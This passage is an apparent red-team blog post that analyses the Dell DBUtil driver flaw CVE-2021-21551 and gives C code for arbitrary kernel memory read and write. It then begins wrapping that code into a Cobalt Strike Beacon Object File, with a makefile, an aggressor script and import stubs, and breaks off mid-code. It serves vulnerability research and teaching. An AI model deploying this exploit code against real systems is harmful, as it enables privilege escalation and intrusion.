<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="/css/template.css?version=2.0.1" /><link rel="shortcut icon" href="/img/favicon.svg?version=2.0.1" type="image/svg+xml" /> <script src="/js/template.js?version=2.0.1"></script><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: light)" /><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: dark)" /><title>A foundation for kernel exploitation via Cobalt Strike</title><meta property="og:title" content="A foundation for kernel exploitation via Cobalt Strike"><meta name="description" itemprop="description" content="Dell's DBUtil kernel driver is vulnerable for an arbitrary kernel memory read/write (CVE-2021-21551). This blog describes how to utilise it in a Cobalt Strike (CS) Beacon Object File (BOF) to perform kernel exploitation. As an example, we escalate privileges to NT AUTHORITY\SYSTEM."><meta property="og:description" content="Dell's DBUtil kernel driver is vulnerable for an arbitrary kernel memory read/write (CVE-2021-21551). This blog describes how to utilise it in a Cobalt Strike (CS) Beacon Object File (BOF) to perform kernel exploitation. As an example, we escalate privileges to NT AUTHORITY\SYSTEM."><meta name="keywords" content="kernel, exploit, beacon, cobalt-strike, bof, red-teaming, cve-2021-21551"><meta name="language" content="english"><meta name="author" itemprop="creator" content="Tijme Gommers"><meta name="robots" content="index, follow"><meta name="distribution" content="global"><meta name="copyright" content="Copyright © 2024 Tijme Gommers. All rights reserved."><link rel="alternate" type="application/rss+xml" title="Atom" href="/feeds/atom.xml"></head><body><div class="navbar-wrapper mb-4"><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><nav class="navbar navbar-expand"><div class="collapse navbar-collapse"><ul class="navbar-nav me-auto"><li class="nav-item"> <a href="/" target="_self" class="nav-link"> <span>Posts</span> </a></li><li class="nav-item"> <a href="/about/" target="_self" class="nav-link"> <span>About</span> </a></li><li class="nav-item"> <a href="/donate/" target="_self" class="nav-link"> <span>Donate</span> </a></li></ul><ul class="navbar-nav"><li class="nav-item"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://www.linkedin.com/in/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://github.com/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="/feeds/atom.xml" target="_blank" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#rss"/></svg> </span></span> </a></li></ul></div></nav></div></div></div></div><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><article class="container-fluid"><h1 class="mb-2">A foundation for kernel exploitation via Cobalt Strike</h1><p class="mb-2 text-muted">Posted on <time datetime="2023-05-16T00:00:00+00:00">16 May 2023</time> by Tijme Gommers.</p><p><strong>[TL;DR]</strong> Dell’s bios kernel driver is vulnerable for an arbitrary kernel memory read/write. This blog describes how to utilise it in a Cobalt Strike (CS) Beacon Object File (BOF) to perform kernel exploitation. As an example, we escalate privileges to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>. The result has been published on <a href="https://github.com/tijme/kernel-mii" target="_blank" rel="noopener noreferrer">GitHub</a>.</p><hr /><p>This blog post consists of 5 chapters. Identifying the <a href="#1-vulnerability">vulnerability</a>, developing an <a href="#2-exploit">exploit</a> to read and write kernel memory, converting everything to a Cobalt Strike (CS) Beacon Object File (BOF) <a href="#3-foundation">foundation</a> that performs privilege escalation, describing its <a href="#4-usage">usage</a>, and a demo of the end <a href="#5-result">result</a>.</p><h3 id="1-vulnerability">1. Vulnerability</h3><p>Loading the <a href="https://github.com/tijme/kernel-mii/raw/master/driver.sys" target="_blank" rel="noopener noreferrer">vulnerable driver</a> in IDA presents the following <code class="language-plaintext highlighter-rouge">DriverEntry</code> function.</p><p><a href="/img/cobalt-strike-bof-foundation-for-kernel-exploitation/ida-driver-entry.svg" target="_blank" rel="noopener noreferrer" data-lightbox="ida-driver-entry" data-title="IDA Driver Entry of dbutil_2_3.sys"><img src="/img/cobalt-strike-bof-foundation-for-kernel-exploitation/ida-driver-entry.svg" title="IDA Driver Entry of dbutil_2_3.sys" alt="IDA Driver Entry of dbutil_2_3.sys" /></a></p><p>The <code class="language-plaintext highlighter-rouge">jmp</code> at the bottom references the actual driver entry written by the developer. That function receives <code class="language-plaintext highlighter-rouge">DRIVER_OBJECT* driver</code> and <code class="language-plaintext highlighter-rouge">IRP* irp</code> as arguments. In that function the <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> callback in <code class="language-plaintext highlighter-rouge">driver-&gt;MajorFunction</code> is set.</p><p><code class="language-plaintext highlighter-rouge">MajorFunction</code> is at offset <code class="language-plaintext highlighter-rouge">0x70</code> on the <code class="language-plaintext highlighter-rouge">DRIVER_OBJECT</code>. The offset of the <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> callback in <code class="language-plaintext highlighter-rouge">MajorFunction</code> is at offset 0x70 as well. The sum is <code class="language-plaintext highlighter-rouge">0xE0</code>, which we can see being set on <code class="language-plaintext highlighter-rouge">rdi</code> (the <code class="language-plaintext highlighter-rouge">DRIVER_OBJECT</code>) in the graph below. Thus, <code class="language-plaintext highlighter-rouge">sub_11170</code> in <code class="language-plaintext highlighter-rouge">rax</code> is the <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> callback.</p><p><a href="/img/cobalt-strike-bof-foundation-for-kernel-exploitation/ida-real-driver-entry-majorfunction.svg" target="_blank" rel="noopener noreferrer" data-lightbox="ida-driver-entry" data-title="IDA Real Driver Entry of dbutil_2_3.sys with MajorFunction[IRP_MJ_DEVICE_CONTROL]"><img src="/img/cobalt-strike-bof-foundation-for-kernel-exploitation/ida-real-driver-entry-majorfunction.svg" title="IDA Real Driver Entry of dbutil_2_3.sys with MajorFunction[IRP_MJ_DEVICE_CONTROL]" alt="IDA Real Driver Entry of dbutil_2_3.sys with MajorFunction[IRP_MJ_DEVICE_CONTROL]" /></a></p><p>As expected, <code class="language-plaintext highlighter-rouge">sub_11170</code> contains a large switch statement with various IO control codes (IOCTLs). I use an IDA Python plugin called <a href="https://github.com/herosi/CTO" target="_blank" rel="noopener noreferrer">Call Tree Overviewer</a> which yields an overview of the call tree, to easily identify what certain switch cases do. It turns out some of the IOCTLs call <code class="language-plaintext highlighter-rouge">memmove</code>, and some call sub functions with <code class="language-plaintext highlighter-rouge">memmove</code>.</p><p>One of these sub functions is <code class="language-plaintext highlighter-rouge">sub_15294</code>, which is called by two IOCTLs (<code class="language-plaintext highlighter-rouge">0x9B0C1EC4</code> and <code class="language-plaintext highlighter-rouge">0x9B0C1EC8</code>). The only difference between the IOCTLs is that, when calling <code class="language-plaintext highlighter-rouge">0x9B0C1EC4</code>, the <code class="language-plaintext highlighter-rouge">dl</code> register is set to <code class="language-plaintext highlighter-rouge">1</code>. <code class="language-plaintext highlighter-rouge">sub_15294</code> receives <code class="language-plaintext highlighter-rouge">rcx</code> as argument. <code class="language-plaintext highlighter-rouge">rcx</code> is set to <code class="language-plaintext highlighter-rouge">rdi</code>, one of the first variables being assembled to a struct, in the <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> callback. It contains two 64-bit integers. The first one being set to <code class="language-plaintext highlighter-rouge">irp-&gt;AssociatedIrp-&gt;SystemBuffer</code> (a user controlled buffer), and the second one to <code class="language-plaintext highlighter-rouge">irp-&gt;CurrentStackLocation-&gt;InputBufferLength</code> (the length of the user controlled buffer).</p><p><a href="/img/cobalt-strike-bof-foundation-for-kernel-exploitation/ida-create-argument-to-ioctl.svg" target="_blank" rel="noopener noreferrer" data-lightbox="ida-create-argument-to-ioctl" data-title="Building the first argument to pass to the vulnerable IOCTLs"><img src="/img/cobalt-strike-bof-foundation-for-kernel-exploitation/ida-create-argument-to-ioctl.svg" title="Building the first argument to pass to the vulnerable IOCTLs" alt="Building the first argument to pass to the vulnerable IOCTLs" /></a></p><p>In <code class="language-plaintext highlighter-rouge">sub_15294</code>, <code class="language-plaintext highlighter-rouge">memmove</code> is being called with arguments based on the first pointer in <code class="language-plaintext highlighter-rouge">rcx</code> (which is the user input, and it seems to be a struct). The function definition of <code class="language-plaintext highlighter-rouge">memmove</code> is included below. Based on the <code class="language-plaintext highlighter-rouge">dl</code> register (which was previously set based on the IOCTL being called), certain properties of the struct are either used for destination or source, implying that <code class="language-plaintext highlighter-rouge">sub_15294</code> supports both reading and writing kernel memory based on user input. If this happens without proper input validation, the kernel driver is vulnerable to a write-what-where vulnerability.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span><span class="o">*</span> <span class="nf">memmove</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">destination</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">source</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">num</span><span class="p">);</span></code></pre></figure><p>In the <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170" target="_blank" rel="noopener noreferrer">Windows 64-bit calling convention</a>, the following registers would be used to call <code class="language-plaintext highlighter-rouge">memmove</code>.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">memmove</span><span class="p">(</span><span class="n">rcx</span><span class="p">,</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">r8</span><span class="p">)</span></code></pre></figure><p>Within <code class="language-plaintext highlighter-rouge">sub_15294</code>, <code class="language-plaintext highlighter-rouge">r9</code> is being set to <code class="language-plaintext highlighter-rouge">irp-&gt;AssociatedIrp-&gt;SystemBuffer</code>. Then two flows are possible. Within the writing flow (IOCTL <code class="language-plaintext highlighter-rouge">0x9B0C1EC8</code>), before calling <code class="language-plaintext highlighter-rouge">memmove</code>:</p><ul><li><code class="language-plaintext highlighter-rouge">rcx/destination</code> points to <code class="language-plaintext highlighter-rouge">r9+0x18</code> (the address to write to).</li><li><code class="language-plaintext highlighter-rouge">rdx</code> points to the sum of <code class="language-plaintext highlighter-rouge">rbx+0x8</code> and <code class="language-plaintext highlighter-rouge">rbx+0x10</code> (the address to write from).</li><li><code class="language-plaintext highlighter-rouge">r8</code> is set to <code class="language-plaintext highlighter-rouge">irp-&gt;CurrentStackLocation-&gt;InputBufferLength</code> minus <code class="language-plaintext highlighter-rouge">24</code>.</li></ul><p>Within the reading flow (IOCTL <code class="language-plaintext highlighter-rouge">0x9B0C1EC4</code>), before calling <code class="language-plaintext highlighter-rouge">memmove</code>:</p><ul><li><code class="language-plaintext highlighter-rouge">rcx/destination</code> points to the sum of <code class="language-plaintext highlighter-rouge">rbx+0x8</code> and <code class="language-plaintext highlighter-rouge">rbx+0x10</code> (the address to read to).</li><li><code class="language-plaintext highlighter-rouge">rdx/source</code> points to <code class="language-plaintext highlighter-rouge">r9+0x18</code> (the address to read from).</li><li><code class="language-plaintext highlighter-rouge">r8</code> is set to <code class="language-plaintext highlighter-rouge">irp-&gt;CurrentStackLocation-&gt;InputBufferLength</code> minus <code class="language-plaintext highlighter-rouge">24</code> (number of bytes to move).</li></ul><p>Concluding, this allows us to construct the following struct:</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PACKET</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">ignore</span><span class="p">;</span>                <span class="c1">// Offset 0x00/00: Ignore</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">user_address</span><span class="p">;</span>          <span class="c1">// Offset 0x08/08: Address to read from or write to</span>
    <span class="kt">uint64_t</span> <span class="n">user_address_offset</span><span class="p">;</span>   <span class="c1">// Offset 0x10/16: Offset (may always be 0)</span>
    <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">kernel_address</span><span class="p">;</span>        <span class="c1">// Offset 0x18/24: Data to write (if writing)</span>
<span class="p">}</span> <span class="n">PACKET</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPACKET</span><span class="p">;</span></code></pre></figure><p>Which will call <code class="language-plaintext highlighter-rouge">memmove</code> in the following ways:</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Writing kernel memory</span>
<span class="n">memmove</span><span class="p">(</span><span class="n">packet</span><span class="o">-&gt;</span><span class="n">kernel_address</span><span class="p">,</span> <span class="n">packet</span><span class="o">-&gt;</span><span class="n">user_address</span> <span class="o">+</span> <span class="n">packet</span><span class="o">-&gt;</span><span class="n">user_address_offset</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

<span class="c1">// Reading kernel memory</span>
<span class="n">memmove</span><span class="p">(</span><span class="n">packet</span><span class="o">-&gt;</span><span class="n">user_address</span> <span class="o">+</span> <span class="n">packet</span><span class="o">-&gt;</span><span class="n">user_address_offset</span><span class="p">,</span> <span class="n">packet</span><span class="o">-&gt;</span><span class="n">kernel_address</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span></code></pre></figure><p>As there is no proper input validation whatsoever, the kernel driver is indeed vulnerable to a write-what-where vulnerability.</p><h3 id="2-exploit">2. Exploit</h3><p>To communicate with the driver, we first need to open a handle to it. The pseudocode below shows how to open a handle to the symbolic link of the driver device. Using the software DeviceTree (from OSR), the ACLs on the symbolic link can be inspected. This shows that <code class="language-plaintext highlighter-rouge">Everyone</code> has permissions to open handle to the symbolic link. Thus, the code below to create a handle to the symbolic link can even be executed by low-privileged users on the system. This gives threat actors the opportunity for privilege escalation.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">dbutil_2_3"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span></code></pre></figure><p>Afterwards, this handle can be used to call the two vulnerable IOCTLs. I’ve created two functions for this. The first one is for reading kernel memory, by passing the device handle and a kernel address to it.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/**
 * Read kernel space memory.
 * 
 * @param HANDLE hDevice The handle to the vulnerable driver.
 * @param uint8_t* kernel_address Kernel space address to read.
 * @return uint8_t* The memory byte stream.
 */</span>
<span class="kt">uint8_t</span><span class="o">*</span> <span class="nf">memoryRead</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDevice</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">kernel_address</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">lpBytesReturned</span><span class="p">;</span>
    <span class="n">PACKET</span> <span class="n">lpBuffer</span><span class="p">;</span>

    <span class="n">lpBuffer</span><span class="p">.</span><span class="n">user_address_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">lpBuffer</span><span class="p">.</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="n">kernel_address</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">ARBITRARY_READ_IOCTL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"DeviceIoControl error in 'memoryRead'."</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="k">return</span> <span class="n">lpBuffer</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure><p>The second one is for writing kernel memory, by passing the device handle, a kernel address and a 64-bit value to write.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/**
 * Write kernel space memory.
 * 
 * @param HANDLE hDevice The handle to the vulnerable driver.
 * @param uint8_t* address Kernel space address to write to.
 * @param uint8_t* user_address The 64-bit value to write.
 * @return uint8_t* The memory byte stream.
 */</span>
<span class="kt">void</span> <span class="nf">memoryWrite</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDevice</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">kernel_address</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">user_address</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">lpBytesReturned</span><span class="p">;</span>
    <span class="n">PACKET</span> <span class="n">lpBuffer</span><span class="p">;</span>

    <span class="n">lpBuffer</span><span class="p">.</span><span class="n">user_address</span> <span class="o">=</span> <span class="n">user_address</span><span class="p">;</span>
    <span class="n">lpBuffer</span><span class="p">.</span><span class="n">user_address_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">lpBuffer</span><span class="p">.</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="n">kernel_address</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">ARBITRARY_WRITE_IOCTL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"DeviceIoControl error in 'memoryWrite'."</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure><p>The code below is proof-of-concept code on how to use these functions. We read from and write to the address <code class="language-plaintext highlighter-rouge">0xfffff78000000000</code>, which holds the <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA</code> struct on 64-bit Windows machines. The first 64-bits of this struct hold <code class="language-plaintext highlighter-rouge">TickCountLowDeprecated</code> (a deprecated <code class="language-plaintext highlighter-rouge">ULONG</code>) and <code class="language-plaintext highlighter-rouge">TickCountMultiplier</code> also a <code class="language-plaintext highlighter-rouge">ULONG</code>.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">dbutil_2_3"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Failed to open handle to kernel driver."</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Reading from 0xfffff78000000000</span>
<span class="kt">uint64_t</span> <span class="n">initialValue</span> <span class="o">=</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0xfffff78000000000</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"0xfffff78000000000: %x."</span><span class="p">,</span> <span class="n">initialValue</span><span class="p">);</span>

<span class="c1">// Writing to 0xfffff78000000000</span>
<span class="n">memoryWrite</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0xfffff78000000000</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"Wrote 1 to 0xfffff78000000000."</span><span class="p">);</span>

<span class="c1">// Recovering 0xfffff78000000000</span>
<span class="n">memoryWrite</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0xfffff78000000000</span><span class="p">,</span> <span class="n">initialValue</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"Recovered 0xfffff78000000000 to %x."</span><span class="p">,</span> <span class="n">initialValue</span><span class="p">);</span></code></pre></figure><h3 id="3-foundation">3. Foundation</h3><p>To create a foundation for kernel exploitation via Cobalt Strike, we convert the exploit to a Beacon Object File that utilises the <code class="language-plaintext highlighter-rouge">memoryRead</code> and <code class="language-plaintext highlighter-rouge">memoryWrite</code> functions. The implementations of these functions may change over time (for example if we use a different vulnerable driver). But if their function definitions stay the same, we can essentialy develop exploits as Beacon Object Files that do not depend on a specific vulnerable driver, but rather the two function definitions.</p><h4 id="31-makefile">3.1 Makefile</h4><p>The first thing we’ll do is create a <code class="language-plaintext highlighter-rouge">makefile</code> to compile our code to both a PE-file and a BOF subsequently.</p><figure class="highlight"><pre><code class="language-plain" data-lang="plain">BOFNAME := KernelMii
CC_x64 := x86_64-w64-mingw32-gcc
CC_x86 := i686-w64-mingw32-gcc

all:
    $(CC_x64) -c ./$(BOFNAME).c -o ./$(BOFNAME).x64.o -masm=intel -DBOF 
    $(CC_x86) -c ./$(BOFNAME).c -o ./$(BOFNAME).x86.o -masm=intel -DBOF 
    $(CC_x64) ./$(BOFNAME).c -o ./$(BOFNAME).x64.exe -masm=intel -lole32 -loleaut32 -lntdll
    $(CC_x86) ./$(BOFNAME).c -o ./$(BOFNAME).x86.exe -masm=intel -lole32 -loleaut32 -lntdll</code></pre></figure><p>In the above <code class="language-plaintext highlighter-rouge">makefile</code>, we’ve defined our x64 and x86 compiler in a variable. Additionally, we define the name of our project in <code class="language-plaintext highlighter-rouge">BOFNAME</code>. When running <code class="language-plaintext highlighter-rouge">make</code>, all commands in the first action will be executed, in this case everything under <code class="language-plaintext highlighter-rouge">all</code>. The first two commands are the compilation to a BOF. As can be seen, the variable <code class="language-plaintext highlighter-rouge">BOF</code> is defined to be used for the macro preprocessor. The second two are for the compilation to a PE-file.</p><h4 id="32-entrypoint">3.2 Entrypoint</h4><p>Usually the <code class="language-plaintext highlighter-rouge">main</code> function is exported and called by a PE-loader on, for example, double click by a user. For a BOF, we can define which function is called on run ourselves. The Cobalt Strike documentation always uses the <code class="language-plaintext highlighter-rouge">go</code> function, so we’ll go ahead and use that as well. In both <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">go</code>, we’ll call the same <code class="language-plaintext highlighter-rouge">boot</code> function.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#ifdef BOF
</span>    <span class="cm">/**
     * CS BOF entry point.
     * 
     * The Cobalt Strike (CS) Beacon Object File (BOF) entry point.
     * 
     * @param char* args The array of arguments.
     * @param int length The length of the array of arguments.
     */</span>
    <span class="kt">void</span> <span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">boot</span><span class="p">();</span>
    <span class="p">}</span>
<span class="cp">#else
</span>    <span class="cm">/**
     * Test the kernel exploit &amp; elavation code
     *
     * @param int argc Amount of arguments in argv.
     * @param char** Array of arguments passed to the program.
     */</span>
    <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">boot</span><span class="p">();</span>
    <span class="p">}</span>
<span class="cp">#endif</span></code></pre></figure><h4 id="33-aggressor-script">3.3 Aggressor script</h4><p>Cobalt Strike uses aggressor scripts (<code class="language-plaintext highlighter-rouge">.cna</code> files) to import functionality, such as Beacon Object Files, into Cobalt Strike. The aggressor script below tells Cobalt Strike to provide the hacker with a function <code class="language-plaintext highlighter-rouge">kernel_mii</code>. When <code class="language-plaintext highlighter-rouge">kernel_mii</code> is called, it will import the compiled Beacon Object File, and run the <code class="language-plaintext highlighter-rouge">go</code> function.</p><figure class="highlight"><pre><code class="language-cna" data-lang="cna">alias kernel_mii {
    local('$file $handle $object $args');

    # Log the current task
    btask($1, "Tasked beacon to run KernelMii!");

    # Find and log object file
    $file = script_resource("KernelMii.o");
    blog($1, $file);

    # Read the object file
    $handle = openf($file);
    $object = readb($handle, -1);
    closef($handle);

    # Pack empty arguments
    $args = bof_pack($1, "zi");
    
    # Run the object file
    beacon_inline_execute($1, $object, "go", $args);
}</code></pre></figure><h4 id="34-headers">3.4 Headers</h4><p>To be able to utilise Cobalt Strike functionality (like printing to the Cobalt Strike console), we need to include a Beacon Object header.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include "headers/beacon.h"</span></code></pre></figure><p>The required contents for the header file can be downloaded <a href="https://raw.githubusercontent.com/tijme/kernel-mii/master/headers/beacon.h" target="_blank" rel="noopener noreferrer">here</a>. It contains all required function definitions to utilise Cobalt Strike functionality.</p><h4 id="35-console">3.5 Console</h4><p>As stated, printing to the Cobalt Strike console works differently than printing to a Windows console. We need to define cross-compatible print methods and use them instead of functions like <code class="language-plaintext highlighter-rouge">printf</code> and <code class="language-plaintext highlighter-rouge">puts</code>. The code below defines <code class="language-plaintext highlighter-rouge">PRINT</code> and <code class="language-plaintext highlighter-rouge">PRINT_ERROR</code>, which will use <code class="language-plaintext highlighter-rouge">fprintf</code> (Windows console) or <code class="language-plaintext highlighter-rouge">BeaconPrintf</code> depending on whether <code class="language-plaintext highlighter-rouge">BOF</code> is defined.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/**
 * Define cross-compatible print methods
 */</span>
<span class="cp">#ifdef BOF
</span>    <span class="cp">#define PRINT(...) { \
        BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
    }
#else
</span>    <span class="cp">#define PRINT(...) { \
        fprintf(stdout, "[+] "); \
        fprintf(stdout, __VA_ARGS__); \
        fprintf(stdout, "\n"); \
    }
#endif
</span>
<span class="cp">#ifdef BOF
</span>    <span class="cp">#define PRINT_ERROR(...) { \
        BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
    }
#else
</span>    <span class="cp">#define PRINT_ERROR(...) { \
        fprintf(stdout, "[!] "); \
        fprintf(stdout, __VA_ARGS__); \
        fprintf(stdout, "\n"); \
    }
#endif</span></code></pre></figure><p>We can now use these functions as follows.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">PRINT_ERROR</span><span class="p">(</span><span class="s">"Could not open handle. Error: %x."</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span></code></pre></figure><h4 id="36-windows-api">3.6 Windows API</h4><p>The print statement above is a good start, but it won’t work in Cobalt Strike. This is because <code class="language-plaintext highlighter-rouge">GetLastError()</code> is called, which is located in <code class="language-plaintext highlighter-rouge">Kernel32.dll</code>. It cannot be resolved by the linker (Cobalt Strike).</p><p>Beacon Object Files require a <code class="language-plaintext highlighter-rouge">__declspec(dllimport)</code> keyword, which is defined in <code class="language-plaintext highlighter-rouge">winnt.h</code> as <code class="language-plaintext highlighter-rouge">DECLSPEC_IMPORT</code>. This indicates to the compiler that this function is found within a DLL, telling the compiler essentially “this function will be resolved later”. Since Cobalt Strike is the linker, this is needed to tell the compiler to let the linking come later. Since the linking will come later, this also means a full function prototype must be supplied to the Beacon Object File (<a href="https://connormcgarr.github.io/thread-hijacking/" target="_blank" rel="noopener noreferrer">source</a>).</p><p>For <code class="language-plaintext highlighter-rouge">GetLastError()</code>, an example is included below. First, we define the prototype definition. Using it, we can call <code class="language-plaintext highlighter-rouge">KERNEL32$GetLastError()</code>. However, as we’re cross-compiling to a PE-file as well, it would be nice to just call <code class="language-plaintext highlighter-rouge">GetLastError()</code>. To do this, we use the macro preprocessor to redirect <code class="language-plaintext highlighter-rouge">GetLastError()</code> to <code class="language-plaintext highlighter-rouge">KERNEL32$GetLastError()</code> for Beacon Object Files.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#ifdef BOF
</span>    <span class="n">DECLSPEC_IMPORT</span> <span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetLastError</span><span class="p">();</span>
